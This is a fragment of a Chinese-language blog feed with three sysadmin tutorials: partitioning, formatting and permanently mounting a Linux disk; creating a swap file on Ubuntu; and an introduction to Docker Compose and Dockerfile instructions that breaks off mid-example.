    <content type="html"><![CDATA[<h1 id="Linux磁盘分区与挂载"><a href="#Linux磁盘分区与挂载" class="headerlink" title="Linux磁盘分区与挂载"></a>Linux磁盘分区与挂载</h1><h2 id="1-lsblk查看当前块设备"><a href="#1-lsblk查看当前块设备" class="headerlink" title="1.lsblk查看当前块设备"></a>1.lsblk查看当前块设备</h2><p><strong>找到没有分区和挂载的磁盘sda</strong></p><p><img src="/img/course/image-20240410042212136.png" alt="image-20240410042212136"></p><h2 id="2-使用-fdisk-对磁盘进行分区"><a href="#2-使用-fdisk-对磁盘进行分区" class="headerlink" title="2.使用 fdisk 对磁盘进行分区"></a>2.<strong>使用 fdisk 对磁盘进行分区</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">fdisk /dev/sda</span><br></code></pre></td></tr></table></figure><p><code>fdisk</code> 命令提供了一个交互式界面，允许用户执行以下任务：</p><ul><li>创建分区（<code>n</code>）</li><li>删除分区（<code>d</code>）</li><li>调整分区大小（<code>r</code>）</li><li>设置分区类型（<code>t</code>）</li><li>保存写入分区表（<code>w</code>）</li><li>退出（<code>q</code>）</li></ul><p><strong>输入n创建分区，剩下直接enter确认（默认分为一个区）</strong></p><img src="/img/course/image-20240410042235008.png" alt="image-20240410042235008" style="zoom:67%;" /><p><img src="/img/course/image-20240410042246880.png" alt="image-20240410042246880"></p><p><strong>再使用lsblk命令可以看到分区已完成</strong></p><p><img src="/img/course/image-20240410042437772.png" alt="image-20240410042437772"></p><h2 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h2><p><strong>查看 <code>/dev/sdb1</code> 分区的类型，可以使用以下命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">df</span> -T /dev/sdc1</span><br>Filesystem     Type 1K-blocks  Used Available Use% Mounted on<br>/dev/sdc1      ext4  65739308    44  62367488   1% /data<br></code></pre></td></tr></table></figure><p><strong>要将 <code>/dev/sda1</code> 分区格式化为 ext4 文件系统，可以使用以下命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ext4 /dev/sda1</span><br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240410042528027.png" alt="image-20240410042528027"></p><h2 id="4-挂载分区"><a href="#4-挂载分区" class="headerlink" title="4.挂载分区"></a>4.挂载分区</h2><p><strong>先创建一个&#x2F;data目录</strong></p><p><img src="/img/course/image-20240410042744611.png" alt="image-20240410042744611"></p><p><strong>然后执行命令挂载分区</strong> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /data</span> <br></code></pre></td></tr></table></figure><h2 id="5-设置永久挂载"><a href="#5-设置永久挂载" class="headerlink" title="5.设置永久挂载"></a>5.设置永久挂载</h2><p> <strong>获取UUID</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo blkid /dev/sda1</span><br>/dev/sda1: UUID=&quot;deb8b33b-c908-4dbc-85a5-311727079736&quot; BLOCK_SIZE=&quot;4096&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;d91cf2eb-01&quot;<br></code></pre></td></tr></table></figure><p><strong>打开 <code>/etc/fstab</code> ，写入<code>UUID=deb8b33b-c908-4dbc-85a5-311727079736     /data   ext4   defaults   0   2</code> 实现永久挂载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo vim /etc/fstab</span>    <br>UUID=deb8b33b-c908-4dbc-85a5-311727079736     /data   ext4   defaults   0   2<br>UUID=c473537c-547e-48f4-b2ca-a2bc4e0d2f2e     /data   ext4   defaults   0   2<br></code></pre></td></tr></table></figure><h2 id="6-检查"><a href="#6-检查" class="headerlink" title="6.检查"></a>6.检查</h2><p><strong>使用<code>df -h</code>可以检查磁盘挂载是否成功</strong></p><p><img src="/img/course/image-20240410210902334.png" alt="image-20240410210902334"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux磁盘分区与挂载&quot;&gt;&lt;a href=&quot;#Linux磁盘分区与挂载&quot; class=&quot;headerlink&quot; title=&quot;Linux磁盘分区与挂载&quot;&gt;&lt;/a&gt;Linux磁盘分区与挂载&lt;/h1&gt;&lt;h2 id=&quot;1-lsblk查看当前块设备&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Linux服务器添加Swap交换空间</title>
    <link href="http://example.com/2024/04/14/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B7%BB%E5%8A%A0Swap%E4%BA%A4%E6%8D%A2%E7%A9%BA%E9%97%B4/"/>
    <id>http://example.com/2024/04/14/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B7%BB%E5%8A%A0Swap%E4%BA%A4%E6%8D%A2%E7%A9%BA%E9%97%B4/</id>
    <published>2024-04-14T11:26:52.000Z</published>
    <updated>2024-04-14T11:42:41.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux服务器添加Swap交换空间"><a href="#Linux服务器添加Swap交换空间" class="headerlink" title="Linux服务器添加Swap交换空间"></a>Linux服务器添加Swap交换空间</h1><h3 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h3><ul><li>Ubuntu 22.04</li></ul><h3 id="Swap空间简介"><a href="#Swap空间简介" class="headerlink" title="Swap空间简介"></a>Swap空间简介</h3><p>Swap空间是一种虚拟内存空间，用于暂时存储操作系统不需要的数据，以便释放物理内存供其他程序使用。在Linux系统中，Swap空间通常是一个磁盘分区或者一个特殊的文件，用于扩展系统的虚拟内存空间。当系统的物理内存不足时，操作系统会将一部分内存中的数据移到Swap空间中，以释放物理内存。</p><p><strong>由于 Swap 空间位于硬盘上，因此访问速度较慢。</strong></p><h2 id="1-查看当前内存与swap"><a href="#1-查看当前内存与swap" class="headerlink" title="1.查看当前内存与swap"></a>1.查看当前内存与swap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ free -m<br>               total        used        free      shared  buff/cache   available<br>Mem:             883         305         219           3         359         428<br>Swap:              0           0           0<br></code></pre></td></tr></table></figure><h3 id="检查-Swap-空间"><a href="#检查-Swap-空间" class="headerlink" title="检查 Swap 空间"></a>检查 Swap 空间</h3><ol><li>执行以下命令检查 Swap 空间是否存在：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon -s<br></code></pre></td></tr></table></figure><p>如果输出为空，则表示没有 Swap 空间。</p><h2 id="2-创建-Swap-分区"><a href="#2-创建-Swap-分区" class="headerlink" title="2.创建 Swap 分区"></a>2.创建 Swap 分区</h2><ol><li><p>使用 <code>dd</code> 命令创建 2GB 的 Swap 分区（可根据服务器配置调整大小：Swap 空间的大小应根据服务器的实际内存和使用情况进行调整。一般来说，Swap 空间的大小应为实际内存的 1-2 倍。</p><p>使用 <code>if=/dev/zero</code> 创建 Swap 分区的原因是：</p><ul><li>它会创建一个包含零字节的文件，这对于 Swap 分区至关重要，因为 Swap 分区必须包含已知的干净数据。</li><li><code>/dev/zero</code> 是一个特殊文件，它会不断生成零字节，这意味着您可以创建任意大小的 Swap 分区。</li></ul><p>使用 <code>if=/dev/zero</code> 可以确保 Swap 分区从一开始就包含干净的数据，并且可以创建任意大小的 Swap 分区。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/mnt/swap bs=1M count=2048<br></code></pre></td></tr></table></figure><ol start="2"><li>设置 Swap 分区文件：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /mnt/swap<br></code></pre></td></tr></table></figure><ol start="3"><li>启用 Swap：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon /mnt/swap<br></code></pre></td></tr></table></figure><h2 id="3-启动时自动挂载Swap-分区"><a href="#3-启动时自动挂载Swap-分区" class="headerlink" title="3.启动时自动挂载Swap 分区"></a>3.启动时自动挂载Swap 分区</h2><ol><li>编辑 <code>/etc/fstab</code> 文件，添加以下行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/mnt/swap swap swap defaults 0 0<br></code></pre></td></tr></table></figure><ul><li><code>/mnt/swap</code>：Swap 分区的挂载点。</li><li><code>swap</code>：指定该分区是 Swap 分区。</li><li><code>swap</code>：指定该分区的文件系统类型是 Swap。</li><li><code>defaults</code>：使用 Swap 分区的默认选项。</li><li><code>0</code>：指定该 Swap 分区在启动时不进行检查。</li><li><code>0</code>：指定该 Swap 分区在启动时不进行转储。</li></ul><h2 id="4-检查swap空间"><a href="#4-检查swap空间" class="headerlink" title="4.检查swap空间"></a>4.检查swap空间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ swapon -s<br>Filename                                Type            Size            Used            Priority<br>/mnt/swap                               file            2097148         0               -2<br>$ free -h<br>               total        used        free      shared  buff/cache   available<br>Mem:           883Mi       280Mi       157Mi       3.0Mi       445Mi       450Mi<br>Swap:          2.0Gi          0B       2.0Gi                                  <br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux服务器添加Swap交换空间&quot;&gt;&lt;a href=&quot;#Linux服务器添加Swap交换空间&quot; class=&quot;headerlink&quot; title=&quot;Linux服务器添加Swap交换空间&quot;&gt;&lt;/a&gt;Linux服务器添加Swap交换空间&lt;/h1&gt;&lt;h3 id=&quot;演</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Docker compose管理</title>
    <link href="http://example.com/2024/04/07/Docker-compose%E7%AE%A1%E7%90%86/"/>
    <id>http://example.com/2024/04/07/Docker-compose%E7%AE%A1%E7%90%86/</id>
    <published>2024-04-07T13:34:51.000Z</published>
    <updated>2024-04-07T14:45:04.820Z</updated>
    
    <content type="html"><![CDATA[<p>Docker Compose 是一个用于定义和运行多容器 Docker 应用程序的工具。允许使用 YAML 文件来配置应用程序的服务,然后使用单个命令部署和启动所有服务。</p><ol><li><p><strong>YAML 配置文件</strong>:</p><ul><li><p>Docker Compose 使用 YAML 文件来定义应用程序的服务。YAML 文件包含服务名称、镜像、端口映射、数据卷等配置信息。</p></li><li><p>例如,一个包含 Web 服务和数据库服务的应用程序的 YAML 文件可能如下所示:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span> <br>    <span class="hljs-attr">volumes:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">.:/code</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">redis</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>环境变量和配置管理</strong>:</p><ul><li>Docker Compose 支持通过环境变量来管理配置信息,如数据库连接字符串、API 密钥等。</li><li>可以在 YAML 文件中使用 <code>$&#123;VARIABLE&#125;</code> 语法引用环境变量。</li><li>这使得在不同的环境(如开发、测试、生产)中部署应用程序时,可以轻松地修改配置信息。</li></ul></li><li><p><strong>网络和依赖管理</strong>:</p><ul><li>Docker Compose 会自动创建一个虚拟网络,并将应用程序的所有服务连接到该网络上。</li><li>服务之间可以通过服务名称进行相互通信,无需知道具体的 IP 地址。</li><li>您还可以定义服务依赖关系,确保在启动某个服务之前,其依赖的其他服务已经启动。</li></ul></li><li><p><strong>扩展和缩容</strong>:</p><ul><li>Docker Compose 支持轻松扩展和缩减应用程序的规模。</li><li>您可以使用 <code>docker-compose scale</code> 命令来增加或减少某个服务的容器数量。</li></ul></li></ol><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具:"></a><strong>命令行工具</strong>:</h2><ul><li>Docker Compose 提供了一个命令行工具 <code>docker-compose</code>。使用该工具可以快速启动、停止和管理应用程序的服务。</li></ul><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>docker-compose up</code></td><td>启动应用程序的所有服务</td><td><code>docker-compose up -d</code> (以后台模式启动)</td></tr><tr><td><code>docker-compose down</code></td><td>停止并删除应用程序的所有服务</td><td><code>docker-compose down</code></td></tr><tr><td><code>docker-compose start</code></td><td>启动已停止的服务</td><td><code>docker-compose start web db</code> (启动 web 和 db 服务)</td></tr><tr><td><code>docker-compose stop</code></td><td>停止正在运行的服务</td><td><code>docker-compose stop web</code> (停止 web 服务)</td></tr><tr><td><code>docker-compose ps</code></td><td>列出应用程序中正在运行的容器</td><td><code>docker-compose ps</code></td></tr><tr><td><code>docker-compose build</code></td><td>构建或重新构建服务的镜像</td><td><code>docker-compose build --no-cache web</code> (不使用缓存构建 web 服务)</td></tr><tr><td><code>docker-compose logs</code></td><td>查看服务的日志输出</td><td><code>docker-compose logs -f web</code> (实时查看 web 服务的日志)</td></tr><tr><td><code>docker-compose exec</code></td><td>在运行的容器中执行命令</td><td><code>docker-compose exec web bash</code> (在 web 容器中执行 bash 命令)</td></tr><tr><td><code>docker-compose scale</code></td><td>扩展或缩减服务的容器数量</td><td><code>docker-compose scale web=3 db=2</code> (将 web 服务扩展到 3 个容器, db 服务扩展到 2 个容器)</td></tr></tbody></table><h2 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a><code>docker-compose.yml</code>文件编写</h2><ol><li><h3 id="版本声明"><a href="#版本声明" class="headerlink" title="版本声明:"></a><strong>版本声明</strong>:</h3><ul><li>每个 YAML 文件都需要以 <code>version</code> 关键字开头,指定所使用的 Docker Compose 版本号。常见的版本号有 <code>&#39;2&#39;</code>、<code>&#39;3&#39;</code> 和 <code>&#39;3.x&#39;</code>。</li></ul></li><li><h3 id="services-部分"><a href="#services-部分" class="headerlink" title="services 部分:"></a><strong>services 部分</strong>:</h3><ul><li><code>services</code> 是 YAML 文件的核心部分,用于定义应用程序的各个服务。</li><li>每个服务都有一个唯一的名称,并包含以下常见的配置项:<ul><li><code>image</code>: 指定运行该服务的 Docker 镜像名称。</li><li><code>build</code>: 如果没有现成的镜像,可以指定构建该服务的 Dockerfile 路径。</li><li><code>ports</code>: 定义服务对外暴露的端口映射,格式为 <code>&quot;host_port:container_port&quot;</code>。</li><li><code>environment</code>: 设置服务运行时的环境变量。</li><li><code>volumes</code>: 定义数据卷,用于持久化服务产生的数据。</li><li><code>depends_on</code>: 指定该服务依赖的其他服务,确保先启动依赖服务。</li><li><code>networks</code>: 将服务连接到指定的网络。</li></ul></li></ul></li><li><h3 id="volumes-和-networks-部分"><a href="#volumes-和-networks-部分" class="headerlink" title="volumes 和 networks 部分:"></a><strong>volumes 和 networks 部分</strong>:</h3><ul><li><code>volumes</code> 部分用于定义数据卷,可以被多个服务共享使用。</li><li><code>networks</code> 部分用于定义虚拟网络,服务之间通过网络名称进行通信。</li></ul></li><li><h3 id="示例配置文件"><a href="#示例配置文件" class="headerlink" title="示例配置文件:"></a><strong>示例配置文件</strong>:</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:latest</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;80:80&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/usr/share/nginx/html</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">frontend</span><br>  <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:5.7</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">password</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db-data:/var/lib/mysql</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span><br>      <br><span class="hljs-attr">volumes:</span><br>  <span class="hljs-attr">db-data:</span><br>    <br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">frontend:</span><br>  <span class="hljs-attr">backend:</span><br></code></pre></td></tr></table></figure><ul><li>该配置文件定义了一个 Web 服务和一个 MySQL 数据库服务,并为它们创建了前端和后端两个网络。</li></ul></li></ol><p>编写 Docker Compose YAML 配置文件时,需要注意服务之间的依赖关系、数据卷和网络的定义,以确保应用程序能够正确部署和运行。</p><h2 id="Dockerfile编写"><a href="#Dockerfile编写" class="headerlink" title="Dockerfile编写"></a>Dockerfile编写</h2><h3 id="Dockerfile中的主要命令"><a href="#Dockerfile中的主要命令" class="headerlink" title="Dockerfile中的主要命令:"></a>Dockerfile中的主要命令:</h3><ol><li><h3 id="FROM-指令"><a href="#FROM-指令" class="headerlink" title="FROM 指令"></a><strong>FROM 指令</strong></h3></li></ol><p>用于指定基础镜像,必须为Dockerfile的第一条指令。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">14</span>-alpine<br></code></pre></td></tr></table></figure><p>上例中,基础镜像为node:14-alpine。</p><ol start="2"><li><h4 id="RUN-指令"><a href="#RUN-指令" class="headerlink" title="RUN 指令"></a><strong>RUN 指令</strong></h4></li></ol><p>用于在镜像中执行指定的命令。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">RUN</span><span class="language-bash"> apk add --no-cache tzdata &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cp</span> /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone</span><br></code></pre></td></tr></table></figure><p>上例中,先使用apk包管理器安装tzdata时区数据包,将上海时区复制为本地时区,并写入时区配置文件。</p><ol start="3"><li><h4 id="COPY-指令"><a href="#COPY-指令" class="headerlink" title="COPY 指令"></a><strong>COPY 指令</strong></h4></li></ol><p>用于将文件或目录从构建环境复制到镜像中。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">COPY</span><span class="language-bash"> . /app</span><br></code></pre></td></tr></table></figure><p>上例中,将当前目录下的所有文件复制到镜像的&#x2F;app目录下。</p><ol start="4"><li><h4 id="ADD-指令"><a href="#ADD-指令" class="headerlink" title="ADD 指令"></a><strong>ADD 指令</strong></h4></li></ol><p>类似于COPY,但ADD还支持从URL获取资源和自动解压缩等功能。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">ADD</span><span class="language-bash"> https://example.com/app.tgz /app/</span><br></code></pre></td></tr></table></figure><p>上例从URL下载app.tgz包并解压到&#x2F;app目录下。</p><ol start="5"><li><h4 id="CMD-指令"><a href="#CMD-指令" class="headerlink" title="CMD 指令"></a><strong>CMD 指令</strong></h4></li></ol><p>用于设置容器启动时执行的默认命令。</p><p><strong>Dockerfile中只能有一条CMD指令。如果列出多个CMD，则只有最后一个CMD才会生效。</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-comment">#格式</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;executable&quot;</span>,<span class="hljs-string">&quot;param1&quot;</span>,<span class="hljs-string">&quot;param2&quot;</span>] 　　　　<span class="hljs-comment">#使用 exec 执行，推荐方式；</span></span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">command</span> param1 param2 　　　　　　　　<span class="hljs-comment">#shell中执行 ( /bin/sh )，提供给需要交互的应用；</span></span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>上例中,容器启动时执行node app.js命令。</p><ol start="6"><li><h4 id="ENTRYPOINT-指令"><a href="#ENTRYPOINT-指令" class="headerlink" title="ENTRYPOINT 指令"></a><strong>ENTRYPOINT 指令</strong></h4></li></ol><p>也用于设置容器入口,但其优先级比CMD高。</p><p>CMD指令指定的容器启动时命令可以被docker run指定的命令覆盖，ENTRYPOINT指令指定的命令不能被覆盖。</p><p>CMD与ENTRYPOINT同时存在时，CMD指令可以为ENTRYPOINT指令设置默认参数。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>]</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>上例中,node为入口命令,app.js为默认参数。</p><ol start="7"><li><h4 id="ENV-指令"><a href="#ENV-指令" class="headerlink" title="ENV 指令"></a><strong>ENV 指令</strong></h4></li></ol><p>用于设置环境变量。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">ENV</span> NODE_ENV=production<br></code></pre></td></tr></table></figure><p>上例设置NODE_ENV环境变量为production。</p><ol start="8"><li><h4 id="WORKDIR-指令"><a href="#WORKDIR-指令" class="headerlink" title="WORKDIR 指令"></a><strong>WORKDIR 指令</strong></h4></li></ol><p>用于设置工作目录,类似于bash的cd命令。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br></code></pre></td></tr></table></figure><p>上例设置工作目录为&#x2F;app。</p><ol start="9"><li><h4 id="EXPOSE-指令"><a href="#EXPOSE-指令" class="headerlink" title="EXPOSE 指令"></a><strong>EXPOSE 指令</strong></h4></li></ol><p>用于告诉Docker容器将要监听的端口。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>上例将暴露容器的8080端口。</p><ol start="10"><li><h4 id="VOLUME-指令"><a href="#VOLUME-指令" class="headerlink" title="VOLUME 指令"></a><strong>VOLUME 指令</strong></h4></li></ol><p>用于创建挂载点,绕过联合文件系统,用于持久化存储。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/data&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>上例在&#x2F;data创建一个挂载点。</p><ol start="11"><li><h4 id="USER-指令"><a href="#USER-指令" class="headerlink" title="USER 指令"></a><strong>USER 指令</strong></h4></li></ol><p>用于指定运行容器的用户。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">USER</span> www<br></code></pre></td></tr></table></figure><p>设置用户为www用户。</p><ol start="12"><li><h4 id="ARG-指令"><a href="#ARG-指令" class="headerlink" title="ARG 指令"></a><strong>ARG 指令</strong></h4></li></ol><p>用于指定构建镜像时的变量值。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">ARG</span> VERSION=<span class="hljs-number">1.0</span><br></code></pre></td></tr></table></figure><p>设置VERSION变量默认为1.0。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">ARG</span> VERSION<br><span class="hljs-keyword">ENV</span> APP_VERSION=$VERSION<br></code></pre></td></tr></table></figure><p>也可以将ARG变量的值赋给ENV环境变量。</p><ol start="13"><li><h4 id="LABEL-指令"><a href="#LABEL-指令" class="headerlink" title="LABEL 指令"></a><strong>LABEL 指令</strong></h4></li></ol><p>用于为镜像添加元数据标签。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;alice@example.com&quot;</span></span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> description=<span class="hljs-string">&quot;This is a Node.js app&quot;</span></span><br></code></pre></td></tr></table></figure><ol start="14"><li><h4 id="SHELL-指令"><a href="#SHELL-指令" class="headerlink" title="SHELL 指令"></a><strong>SHELL 指令</strong></h4></li></ol><p>用于设置执行命令使用的shell。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">SHELL</span><span class="language-bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>上例设置使用bash执行命令,并使用-c选项允许从字符串读取命令。</p><h4 id="示例Dockerfile："><a href="#示例Dockerfile：" class="headerlink" title="示例Dockerfile："></a>示例Dockerfile：</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-comment"># 使用基础镜像</span><br><span class="hljs-keyword">FROM</span> ubuntu:latest<br><br><span class="hljs-comment"># 添加作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;yourname&quot;</span></span><br><br><span class="hljs-comment"># 